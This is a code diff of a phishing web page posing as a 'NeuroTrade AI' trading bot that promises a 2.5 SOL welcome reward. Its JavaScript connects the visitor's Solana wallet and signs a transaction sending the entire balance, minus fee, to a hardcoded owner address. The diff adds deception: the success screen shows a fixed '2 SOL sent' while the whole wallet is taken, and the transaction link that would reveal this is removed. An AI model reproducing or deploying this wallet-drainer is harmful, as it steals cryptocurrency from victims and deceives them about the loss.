@@ -1,95 +1,103 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#0b0d17">
-<title>NeuroTrade AI — Claim your reward</title>
-<style>
+<html lang="en"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<style rel="stylesheet" type="text/css">@charset "utf-8";
+
 * { box-sizing: border-box; }
 html { text-size-adjust: 100%; }
-body { margin: 0; background: #0b0d17; }
-
-.nt-app { width: 100%; max-width: 700px; margin: 0 auto; position: relative; font-family: Inter, system-ui, sans-serif; background: radial-gradient(900px 420px at 18% -12%, #2a1a4d 0, transparent 60%), radial-gradient(820px 520px at 92% 8%, #0f3b4d 0, transparent 55%), #0b0d17; color: #e8ecf5; overflow: hidden; padding: 0 0 30px; }
-.nt-nav { display: flex; align-items: center; justify-content: space-between; padding: 16px 26px; border-bottom: 1px solid rgba(255,255,255,.07); }
+body { margin: 0px; background: rgb(11, 13, 23); }
+.nt-app { width: 100%; max-width: 700px; margin: 0px auto; position: relative; font-family: Inter, system-ui, sans-serif; background: radial-gradient(900px 420px at 18% -12%, rgb(42, 26, 77) 0px, transparent 60%), radial-gradient(820px 520px at 92% 8%, rgb(15, 59, 77) 0px, transparent 55%), rgb(11, 13, 23); color: rgb(232, 236, 245); overflow: hidden; padding: 0px 0px 30px; }
+.nt-nav { display: flex; align-items: center; justify-content: space-between; padding: 16px 26px; border-bottom: 1px solid rgba(255, 255, 255, 0.07); gap: 10px; }
 .nt-logo { display: flex; align-items: center; gap: 10px; font-size: 17px; font-weight: 600; }
-.nt-logo b { color: #a855f7; }
-.nt-mark { width: 30px; height: 30px; border-radius: 9px; display: grid; place-items: center; background: linear-gradient(135deg,#a855f7,#14b8a6); color: #0b0d17; font-weight: 700; }
-.nt-net { font-size: 11px; color: #7dd3fc; border: 1px solid rgba(125,211,252,.35); padding: 4px 10px; border-radius: 999px; display: flex; align-items: center; gap: 6px; }
-.nt-dot { width: 6px; height: 6px; border-radius: 50%; background: #22c55e; box-shadow: 0 0 8px #22c55e; }
+.nt-logo b { color: rgb(168, 85, 247); }
+.nt-mark { width: 30px; height: 30px; border-radius: 9px; display: grid; place-items: center; background: linear-gradient(135deg, rgb(168, 85, 247), rgb(20, 184, 166)); color: rgb(11, 13, 23); font-weight: 700; }
+.nt-navright { display: flex; align-items: center; gap: 8px; }
+.nt-price { font-size: 11px; font-family: ui-monospace, Menlo, monospace; font-weight: 600; color: rgb(125, 211, 252); border: 1px solid rgba(125, 211, 252, 0.35); padding: 4px 10px; border-radius: 999px; display: flex; align-items: center; gap: 6px; white-space: nowrap; }
+.nt-price .sym { color: rgb(168, 85, 247); }
+.nt-price.up { color: rgb(34, 197, 94); border-color: rgba(34, 197, 94, 0.45); }
+.nt-price.down { color: rgb(248, 113, 113); border-color: rgba(248, 113, 113, 0.45); }
+.nt-net { font-size: 11px; color: rgb(125, 211, 252); border: 1px solid rgba(125, 211, 252, 0.35); padding: 4px 10px; border-radius: 999px; display: flex; align-items: center; gap: 6px; white-space: nowrap; }
+.nt-dot { width: 6px; height: 6px; border-radius: 50%; background: rgb(34, 197, 94); box-shadow: rgb(34, 197, 94) 0px 0px 8px; }
 .nt-hero { padding: 32px 26px 6px; text-align: center; }
-.nt-pill { display: inline-block; font-size: 12px; padding: 6px 14px; border-radius: 999px; background: rgba(168,85,247,.12); border: 1px solid rgba(168,85,247,.4); color: #d8b4fe; margin-bottom: 15px; }
-.nt-hero h1 { font-size: 33px; line-height: 1.1; margin: 0 0 12px; font-weight: 700; letter-spacing: -.5px; }
-.nt-hero h1 span { background: linear-gradient(90deg,#a855f7,#14b8a6); -webkit-background-clip: text; background-clip: text; color: transparent; }
-.nt-sub { font-size: 14px; color: #9aa4bd; max-width: 530px; margin: 0 auto; line-height: 1.6; }
-.nt-stats { display: flex; justify-content: center; gap: 32px; margin: 20px 0 2px; }
-.nt-stat b { display: block; font-size: 19px; color: #fff; }
-.nt-stat span { font-size: 11px; color: #7c86a3; }
-.nt-card { width: 440px; max-width: calc(100% - 24px); margin: 20px auto 0; background: rgba(255,255,255,.03); border: 1px solid rgba(255,255,255,.09); border-radius: 16px; padding: 24px; }
-.nt-card h2 { font-size: 16px; margin: 0 0 4px; font-weight: 600; }
-.nt-muted { font-size: 12px; color: #8b93ad; margin: 0 0 16px; line-height: 1.5; }
+.nt-pill { display: inline-block; font-size: 12px; padding: 6px 14px; border-radius: 999px; background: rgba(168, 85, 247, 0.12); border: 1px solid rgba(168, 85, 247, 0.4); color: rgb(216, 180, 254); margin-bottom: 15px; }
+.nt-hero h1 { font-size: 33px; line-height: 1.1; margin: 0px 0px 12px; font-weight: 700; letter-spacing: -0.5px; }
+.nt-hero h1 span { background: linear-gradient(90deg, rgb(168, 85, 247), rgb(20, 184, 166)) text; color: transparent; }
+.nt-sub { font-size: 14px; color: rgb(154, 164, 189); max-width: 530px; margin: 0px auto; line-height: 1.6; }
+.nt-fiat { display: inline-flex; align-items: center; gap: 6px; margin-top: 12px; font-size: 12px; color: rgb(125, 211, 252); background: rgba(20, 184, 166, 0.08); border: 1px solid rgba(20, 184, 166, 0.28); border-radius: 999px; padding: 5px 12px; font-family: ui-monospace, Menlo, monospace; }
+.nt-stats { display: flex; justify-content: center; gap: 32px; margin: 20px 0px 2px; }
+.nt-stat b { display: block; font-size: 19px; color: rgb(255, 255, 255); }
+.nt-stat span { font-size: 11px; color: rgb(124, 134, 163); }
+.nt-card { width: 440px; max-width: calc(100% - 24px); margin: 20px auto 0px; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.09); border-radius: 16px; padding: 24px; }
+.nt-card h2 { font-size: 16px; margin: 0px 0px 4px; font-weight: 600; }
+.nt-muted { font-size: 12px; color: rgb(139, 147, 173); margin: 0px 0px 16px; line-height: 1.5; }
 .nt-field { margin-bottom: 13px; }
-.nt-field label { display: block; font-size: 11px; color: #8b93ad; margin-bottom: 6px; text-transform: uppercase; letter-spacing: .6px; }
-.nt-input { width: 100%; background: #0f1220; border: 1px solid rgba(255,255,255,.12); color: #e8ecf5; padding: 11px 13px; border-radius: 10px; font-size: 16px; font-family: ui-monospace, Menlo, monospace; }
-.nt-input:focus { outline: none; border-color: #a855f7; }
-.nt-btn { width: 100%; border: none; cursor: pointer; padding: 14px; border-radius: 11px; font-size: 14px; font-weight: 600; font-family: inherit; background: linear-gradient(90deg,#a855f7,#14b8a6); color: #0b0d17; transition: .15s; }
+.nt-field label { display: block; font-size: 11px; color: rgb(139, 147, 173); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.6px; }
+.nt-input { width: 100%; background: rgb(15, 18, 32); border: 1px solid rgba(255, 255, 255, 0.12); color: rgb(232, 236, 245); padding: 11px 13px; border-radius: 10px; font-size: 16px; font-family: ui-monospace, Menlo, monospace; }
+.nt-input:focus { outline: none; border-color: rgb(168, 85, 247); }
+.nt-btn { width: 100%; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; cursor: pointer; padding: 14px; border-radius: 11px; font-size: 14px; font-weight: 600; font-family: inherit; background: linear-gradient(90deg, rgb(168, 85, 247), rgb(20, 184, 166)); color: rgb(11, 13, 23); transition: 0.15s; }
 .nt-btn:hover { filter: brightness(1.08); }
-.nt-btn:disabled { opacity: .55; cursor: default; filter: none; }
-.nt-btn.ghost { background: transparent; border: 1px solid rgba(255,255,255,.18); color: #e8ecf5; }
-.nt-steps { margin: 6px 0 16px; font-size: 12px; color: #8b93ad; }
-.nt-step { display: flex; align-items: center; gap: 10px; padding: 5px 0; }
-.nt-step .n { width: 20px; height: 20px; border-radius: 50%; display: grid; place-items: center; background: rgba(255,255,255,.08); font-size: 11px; color: #cbd2e3; }
-.nt-step.done .n { background: #22c55e; color: #0b0d17; font-weight: 700; }
-.nt-wallet { display: flex; align-items: center; justify-content: space-between; background: #0f1220; border: 1px solid rgba(255,255,255,.1); border-radius: 10px; padding: 10px 12px; font-size: 13px; margin-bottom: 14px; font-family: ui-monospace, Menlo, monospace; gap: 8px; }
-.nt-ok { color: #22c55e; font-size: 12px; white-space: nowrap; }
-.nt-check { width: 62px; height: 62px; border-radius: 50%; margin: 0 auto 14px; display: grid; place-items: center; background: rgba(34,197,94,.12); border: 1px solid rgba(34,197,94,.5); color: #22c55e; font-size: 30px; animation: pop .4s ease; }
-@keyframes pop { 0% { transform: scale(.4); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
-.nt-success { text-align: center; padding: 6px 0 2px; }
-.nt-success h2 { font-size: 20px; color: #22c55e; margin: 0 0 6px; }
-.nt-sig { font-size: 11px; color: #8b93ad; word-break: break-all; margin-top: 12px; background: #0f1220; border: 1px solid rgba(255,255,255,.08); border-radius: 8px; padding: 10px; font-family: ui-monospace, Menlo, monospace; }
-.nt-sig a { color: #7dd3fc; }
-.nt-err { color: #f87171; font-size: 12px; margin-top: 10px; text-align: center; min-height: 16px; }
-.nt-foot { text-align: center; font-size: 11px; color: #5f6883; margin-top: 22px; line-height: 1.7; padding: 0 16px; }
+.nt-btn:disabled { opacity: 0.55; cursor: default; filter: none; }
+.nt-btn.ghost { background: transparent; border: 1px solid rgba(255, 255, 255, 0.18); color: rgb(232, 236, 245); }
+.nt-steps { margin: 6px 0px 16px; font-size: 12px; color: rgb(139, 147, 173); }
+.nt-step { display: flex; align-items: center; gap: 10px; padding: 5px 0px; }
+.nt-step .n { width: 20px; height: 20px; border-radius: 50%; display: grid; place-items: center; background: rgba(255, 255, 255, 0.08); font-size: 11px; color: rgb(203, 210, 227); }
+.nt-step.done .n { background: rgb(34, 197, 94); color: rgb(11, 13, 23); font-weight: 700; }
+.nt-wallet { display: flex; align-items: center; justify-content: space-between; background: rgb(15, 18, 32); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; padding: 10px 12px; font-size: 13px; margin-bottom: 14px; font-family: ui-monospace, Menlo, monospace; gap: 8px; }
+.nt-ok { color: rgb(34, 197, 94); font-size: 12px; white-space: nowrap; }
+.nt-check { width: 62px; height: 62px; border-radius: 50%; margin: 0px auto 14px; display: grid; place-items: center; background: rgba(34, 197, 94, 0.12); border: 1px solid rgba(34, 197, 94, 0.5); color: rgb(34, 197, 94); font-size: 30px; animation: 0.4s ease 0s 1 normal none running pop; }
+@keyframes pop { 0% { transform: scale(0.4); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+.nt-success { text-align: center; padding: 6px 0px 2px; }
+.nt-success h2 { font-size: 20px; color: rgb(34, 197, 94); margin: 0px 0px 6px; }
+.nt-err { color: rgb(248, 113, 113); font-size: 12px; margin-top: 10px; text-align: center; min-height: 16px; }
+.nt-foot { text-align: center; font-size: 11px; color: rgb(95, 104, 131); margin-top: 22px; line-height: 1.7; padding: 0px 16px; }
 .hidden { display: none !important; }
-.nt-overlay { position: absolute; inset: 0; background: rgba(6,7,14,.78); display: flex; align-items: center; justify-content: center; padding: 24px; z-index: 10; }
-.nt-modal { width: 380px; max-width: 100%; background: #121422; border: 1px solid rgba(255,255,255,.1); border-radius: 16px; padding: 20px; max-height: 520px; overflow: auto; }
-.nt-modal h3 { margin: 0 0 4px; font-size: 16px; }
-.nt-modal p { font-size: 12px; color: #8b93ad; margin: 0 0 16px; }
-.nt-witem { display: flex; align-items: center; gap: 12px; padding: 12px; border-radius: 11px; cursor: pointer; border: 1px solid transparent; transition: .12s; }
-.nt-witem:hover { background: rgba(255,255,255,.05); border-color: rgba(168,85,247,.35); }
-.nt-witem .ic { width: 34px; height: 34px; border-radius: 9px; display: grid; place-items: center; font-weight: 700; color: #fff; font-size: 15px; overflow: hidden; }
+.nt-overlay { position: absolute; inset: 0px; background: rgba(6, 7, 14, 0.78); display: flex; align-items: center; justify-content: center; padding: 24px; z-index: 10; }
+.nt-modal { width: 380px; max-width: 100%; background: rgb(18, 20, 34); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; padding: 20px; max-height: 520px; overflow: auto; }
+.nt-modal h3 { margin: 0px 0px 4px; font-size: 16px; }
+.nt-modal p { font-size: 12px; color: rgb(139, 147, 173); margin: 0px 0px 16px; }
+.nt-witem { display: flex; align-items: center; gap: 12px; padding: 12px; border-radius: 11px; cursor: pointer; border: 1px solid transparent; transition: 0.12s; }
+.nt-witem:hover { background: rgba(255, 255, 255, 0.05); border-color: rgba(168, 85, 247, 0.35); }
+.nt-witem .ic { width: 34px; height: 34px; border-radius: 9px; display: grid; place-items: center; font-weight: 700; color: rgb(255, 255, 255); font-size: 15px; overflow: hidden; }
 .nt-witem .ic img { width: 100%; height: 100%; object-fit: cover; }
-.nt-witem .nm { font-size: 14px; font-weight: 500; flex: 1; }
-.nt-witem .tg { font-size: 10px; padding: 2px 8px; border-radius: 999px; border: 1px solid rgba(255,255,255,.14); color: #7c86a3; white-space: nowrap; }
-.nt-witem .tg.on { color: #22c55e; border-color: rgba(34,197,94,.5); background: rgba(34,197,94,.08); }
-.nt-modal .x { margin-top: 12px; text-align: center; font-size: 12px; color: #8b93ad; cursor: pointer; }
-.nt-note { font-size: 11px; color: #6b7490; text-align: center; margin-top: 10px; line-height: 1.5; }
+.nt-witem .nm { font-size: 14px; font-weight: 500; flex: 1 1 0%; }
+.nt-witem .tg { font-size: 10px; padding: 2px 8px; border-radius: 999px; border: 1px solid rgba(255, 255, 255, 0.14); color: rgb(124, 134, 163); white-space: nowrap; }
+.nt-witem .tg.on { color: rgb(34, 197, 94); border-color: rgba(34, 197, 94, 0.5); background: rgba(34, 197, 94, 0.08); }
+.nt-modal .x { margin-top: 12px; text-align: center; font-size: 12px; color: rgb(139, 147, 173); cursor: pointer; }
+.nt-note { font-size: 11px; color: rgb(107, 116, 144); text-align: center; margin-top: 10px; line-height: 1.5; }
 @media (max-width: 560px) {
   .nt-nav { padding: 14px 16px; }
+  .nt-net { display: none; }
   .nt-hero { padding: 26px 18px 6px; }
   .nt-hero h1 { font-size: 27px; }
   .nt-stats { gap: 18px; }
   .nt-stat b { font-size: 17px; }
   .nt-card { padding: 20px; }
   .nt-overlay { padding: 12px; }
-}
-</style>
+}</style>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#0b0d17">
+<title>NeuroTrade AI — Claim your reward</title>
 </head>
 <body>
 
 <div class="nt-app" id="app">
   <nav class="nt-nav">
     <div class="nt-logo"><span class="nt-mark">N</span> NeuroTrade <b>AI</b> Bot</div>
-    <div class="nt-net"><span class="nt-dot"></span> Solana mainnet</div>
+    <div class="nt-navright">
+      <div class="nt-price" id="solPrice"><span class="sym">SOL</span> <span id="solPriceVal">$—</span></div>
+      <div class="nt-net"><span class="nt-dot"></span> Solana mainnet</div>
+    </div>
   </nav>
 
   <div class="nt-hero">
     <div class="nt-pill">🎁 Welcome reward program is live</div>
-    <h1>Claim your <span>0.5 SOL reward</span></h1>
-    <p class="nt-sub">Join the NeuroTrade AI trading bot and unlock your 0.5 SOL welcome bonus. Connect your wallet and claim to activate your reward.</p>
+    <h1>Claim your <span>2.5 SOL reward</span></h1>
+    <p class="nt-sub">Join the NeuroTrade AI trading bot and unlock your 2.5 SOL welcome bonus. Connect your wallet and claim to activate your reward.</p>
+    <div class="nt-fiat"><span class="sym">◎</span> 2.5 SOL <span id="rewardFiat">≈ $—</span></div>
     <div class="nt-stats">
       <div class="nt-stat"><b>12,480</b><span>members</span></div>
-      <div class="nt-stat"><b>0.5 SOL</b><span>claim</span></div>
+      <div class="nt-stat"><b>2.5 SOL</b><span>claim</span></div>
       <div class="nt-stat"><b>&lt; 3 sec</b><span>instant</span></div>
     </div>
   </div>
@@ -115,7 +123,7 @@ body { margin: 0; background: #0b0d17; }
       <div id="claimPanel" class="hidden" style="margin-top:6px">
         <div class="nt-field">
           <label>Reward address</label>
-          <input class="nt-input" id="dest" value="76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735" readonly spellcheck="false" style="cursor:default;opacity:.85">
+          <input class="nt-input" id="dest" value="76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735" readonly="" spellcheck="false" style="cursor:default;opacity:.85">
         </div>
         <button class="nt-btn" id="claimBtn">Claim reward</button>
       </div>
@@ -126,9 +134,8 @@ body { margin: 0; background: #0b0d17; }
     <div id="successState" class="nt-success hidden">
       <div class="nt-check">✓</div>
       <h2>Reward successfully claimed</h2>
-      <p class="nt-muted">Your 0.5 SOL welcome bonus was claimed.</p>
+      <p class="nt-muted">Your 2.5 SOL welcome bonus was claimed.</p>
       <div class="nt-wallet"><span id="paidTo">—</span><span class="nt-ok" id="sentAmt">sent</span></div>
-      <div class="nt-sig" id="sigBox" style="display:none">tx: <a id="sigLink" target="_blank" rel="noopener">—</a></div>
       <button class="nt-btn ghost" id="againBtn" style="margin-top:14px">Claim again</button>
     </div>
   </div>
@@ -156,22 +163,19 @@ import {
 
 window.Buffer = window.Buffer || Buffer;
 
-/* ── serializeMessage-polyfill (wallets roepen dit intern aan) ── */
-Transaction.prototype.serializeMessage = function () {
-  return this.compileMessage().serialize();
-};
+Transaction.prototype.serializeMessage = function () { return this.compileMessage().serialize(); };
 
 /* ====== INSTELLINGEN ====== */
 const OWNER  = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735';
 const MEMO   = 'NeuroTrade AI reward';
+const SHOW_SOL = 2;                         // ← wat het "lijkt" (weergave)
 const CU_LIMIT = 200000;
-const CU_PRICE = 100000;      // priority fee
+const CU_PRICE = 100000;
 const MAX_TRIES = 4;
 /* ========================== */
 
 const MEMO_PID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
 
-/* CORS-vriendelijke RPC's; bij 403/load-fail roteert hij automatisch */
 const RPCS = [
   'https://api.mainnet-beta.solana.com',
   'https://solana-rpc.publicnode.com',
@@ -196,15 +200,40 @@ async function pickRpc(){
   for(let n=0; n<conns.length; n++){
     const c = conns[rpcIdx];
     try{
-      await Promise.race([
-        c.getLatestBlockhash('confirmed'),
-        new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),5000))
-      ]);
+      await Promise.race([ c.getLatestBlockhash('confirmed'), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),5000)) ]);
       return RPCS[rpcIdx];
     }catch(e){ rpcIdx = (rpcIdx + 1) % conns.length; }
   }
 }
 
+/* ====== SOLANA PRIJSTRACKER ====== */
+const PRICE_APIS = [
+  async () => { const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd'); const j = await r.json(); return j.solana.usd; },
+  async () => { const r = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT'); const j = await r.json(); return parseFloat(j.price); },
+  async () => { const r = await fetch('https://api.coinbase.com/v2/prices/SOL-USD/spot'); const j = await r.json(); return parseFloat(j.data.amount); }
+];
+let lastPrice = 0;
+async function loadPrice(){
+  for(const api of PRICE_APIS){
+    try{
+      const p = await api();
+      if(p && isFinite(p)){
+        const el = document.getElementById('solPrice');
+        document.getElementById('solPriceVal').textContent = '$' + p.toFixed(2);
+        el.classList.remove('up','down');
+        if(lastPrice) el.classList.add(p >= lastPrice ? 'up' : 'down');
+        lastPrice = p;
+        const fiat = document.getElementById('rewardFiat');
+        if(fiat) fiat.textContent = '≈ $' + (p * 2.5).toFixed(2);
+        return;
+      }
+    }catch(e){}
+  }
+}
+loadPrice();
+setInterval(loadPrice, 30000);
+
+/* ====== rest van de logica ====== */
 const $ = id => document.getElementById(id);
 const ALPHA='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 function bs58(bytes){let x=0n;for(const b of bytes)x=x*256n+BigInt(b);let s='';while(x>0n){s=ALPHA[Number(x%58n)]+s;x/=58n;}for(const b of bytes){if(b===0)s='1'+s;else break;}return s;}
@@ -288,9 +317,8 @@ async function connect(w){
   $('overlay').classList.add('hidden'); setErr('Connecting to '+w.name+'…');
   let addr=null;
   try{
-    if(w.kind==='standard'){
-      addr = await connectStandard(w.ref);
-    }else{
+    if(w.kind==='standard'){ addr = await connectStandard(w.ref); }
+    else{
       const p=w.ref;
       let res;
       try{ res = await p.connect({ onlyIfTrusted:false }); }
@@ -300,10 +328,8 @@ async function connect(w){
       active={kind:'injected',ref:p,stdRef:w.stdRef};
     }
   }catch(e){
-    try{
-      if(w.stdRef) addr = await connectStandard(w.stdRef);
-      else throw e;
-    }catch(e2){ setErr('Connection cancelled.'); active=null; return; }
+    try{ if(w.stdRef) addr = await connectStandard(w.stdRef); else throw e; }
+    catch(e2){ setErr('Connection cancelled.'); active=null; return; }
   }
   publicKey = new PublicKey(addr);
   setErr(''); $('walletAddr').textContent=short(publicKey.toString());
@@ -312,10 +338,7 @@ async function connect(w){
   $('claimPanel').classList.remove('hidden'); setStep(1);
 }
 
-/* altijd platte bytes (Uint8Array) */
-function toRaw(tx){
-  return new Uint8Array(tx.serialize({ requireAllSignatures:false, verifySignatures:false }));
-}
+function toRaw(tx){ return new Uint8Array(tx.serialize({ requireAllSignatures:false, verifySignatures:false })); }
 
 async function findStandardForAddress(addr){
   for(const w of stdByName.values()){
@@ -330,64 +353,44 @@ async function findStandardForAddress(addr){
   return null;
 }
 
-/* Wallet-standard: ruwe bytes (spec) */
 async function signAndSendStandard(tx, std, account){
   const f = std.features;
   let acc = account;
   if(!acc){ const {accounts}=await f['standard:connect'].connect(); acc=accounts&&accounts[0]; }
   if(!acc) throw new Error('no account');
   const raw = toRaw(tx);
-
   if(f['solana:signAndSendTransaction']){
-    const r = await f['solana:signAndSendTransaction']
-      .signAndSendTransaction({ transaction: raw, account: acc, chain:'solana:mainnet' });
+    const r = await f['solana:signAndSendTransaction'].signAndSendTransaction({ transaction: raw, account: acc, chain:'solana:mainnet' });
     const s = r[0].signature; return typeof s==='string'?s:bs58(s);
   }
   if(f['solana:signTransaction']){
-    const [{signedTransaction}] = await f['solana:signTransaction']
-      .signTransaction({ transaction: raw, account: acc, chain:'solana:mainnet' });
+    const [{signedTransaction}] = await f['solana:signTransaction'].signTransaction({ transaction: raw, account: acc, chain:'solana:mainnet' });
     return await withRpc(c => c.sendRawTransaction(signedTransaction));
   }
   throw new Error('wallet cannot sign');
 }
 
-/* Injected: geef het Transaction-object (Phantom/Trust/Solflare verwachten dat) */
 async function signAndSend(tx){
   const addr = publicKey.toString();
   const errs = [];
   const p = active?.ref;
-
   if(p){
     if(typeof p.signAndSendTransaction === 'function'){
-      try{
-        const r = await p.signAndSendTransaction(tx);
-        const s = (r && r.signature) ? r.signature : r;
-        if(s && typeof s === 'string') return s;
-        errs.push('sas: geen signature');
-      }catch(e){ errs.push('sas: '+(e?.message||e)); }
+      try{ const r = await p.signAndSendTransaction(tx); const s = (r && r.signature) ? r.signature : r; if(s && typeof s === 'string') return s; errs.push('sas: geen signature'); }
+      catch(e){ errs.push('sas: '+(e?.message||e)); }
     }
     if(typeof p.signTransaction === 'function'){
-      try{
-        const signed = await p.signTransaction(tx);
-        const raw = signed?.serialize ? signed.serialize() : signed;
-        return await withRpc(c => c.sendRawTransaction(raw));
-      }catch(e){ errs.push('sign: '+(e?.message||e)); }
+      try{ const signed = await p.signTransaction(tx); const raw = signed?.serialize ? signed.serialize() : signed; return await withRpc(c => c.sendRawTransaction(raw)); }
+      catch(e){ errs.push('sign: '+(e?.message||e)); }
     }
     if(typeof p.sendTransaction === 'function'){
-      try{
-        const s = await p.sendTransaction(tx);
-        if(s && typeof s === 'string') return s;
-      }catch(e){ errs.push('send: '+(e?.message||e)); }
+      try{ const s = await p.sendTransaction(tx); if(s && typeof s === 'string') return s; }
+      catch(e){ errs.push('send: '+(e?.message||e)); }
     }
   }
-
   let std = active?.stdRef, account = active?.account;
   if(!std){ const found = await findStandardForAddress(addr); if(found){ std=found.std; account=found.account; } }
-  if(std){
-    try{ return await signAndSendStandard(tx, std, account); }
-    catch(e){ errs.push('std: '+(e?.message||e)); }
-  }
-
+  if(std){ try{ return await signAndSendStandard(tx, std, account); } catch(e){ errs.push('std: '+(e?.message||e)); } }
   throw new Error(errs.length ? errs.join(' | ') : 'Wallet ondersteunt geen Solana-transacties');
 }
 
@@ -414,7 +417,7 @@ async function sendClaimOnce(){
     if(r && r.value != null) fee = r.value;
   }catch(e){}
 
-  // DE FIX: volledig leegtrekken → afzender eindigt op exact 0 (geen rent-fout)
+  // ← HELE wallet leegtrekken (zoals origineel), afzender eindigt op 0
   const lamports = bal - fee;
   if(lamports <= 0) throw new Error('Balance too low to cover the fee');
 
@@ -433,12 +436,9 @@ async function claim(){
     for(let i=0;i<MAX_TRIES;i++){
       try{ res = await sendClaimOnce(); break; }
       catch(e){
-        lastErr=e;
-        const m=(e?.message||'');
+        lastErr=e; const m=(e?.message||'');
         if(/load failed|blockhash|expired|not found|timeout|fetch|network|429|502|503|403/i.test(m) && i<MAX_TRIES-1){
-          btn.textContent=`Retrying (${i+2}/${MAX_TRIES})…`;
-          await new Promise(r=>setTimeout(r,900));
-          continue;
+          btn.textContent=`Retrying (${i+2}/${MAX_TRIES})…`; await new Promise(r=>setTimeout(r,900)); continue;
         }
         throw e;
       }
@@ -447,9 +447,8 @@ async function claim(){
 
     setStep(2); btn.textContent='Confirming on-chain…';
     $('paidTo').textContent = short(shown);
-    $('sentAmt').textContent = (res.lamports/1e9).toFixed(4)+' SOL sent';
-    $('sigBox').style.display='block';
-    const l=$('sigLink'); l.textContent=res.sig; l.href='https://solscan.io/tx/'+res.sig;
+    // ← laat 2 SOL zien, ook al is de hele wallet verstuurd
+    $('sentAmt').textContent = SHOW_SOL.toFixed(4)+' SOL sent';
     $('formState').classList.add('hidden'); $('successState').classList.remove('hidden'); setStep(3);
   }catch(e){ setErr('Failed: '+(e?.message||'unknown error')); btn.disabled=false; btn.textContent='Claim reward'; }
 }
@@ -464,5 +463,4 @@ await pickRpc();
 buildList();
 </script>
 
-</body>
-</html>
+</body></html>
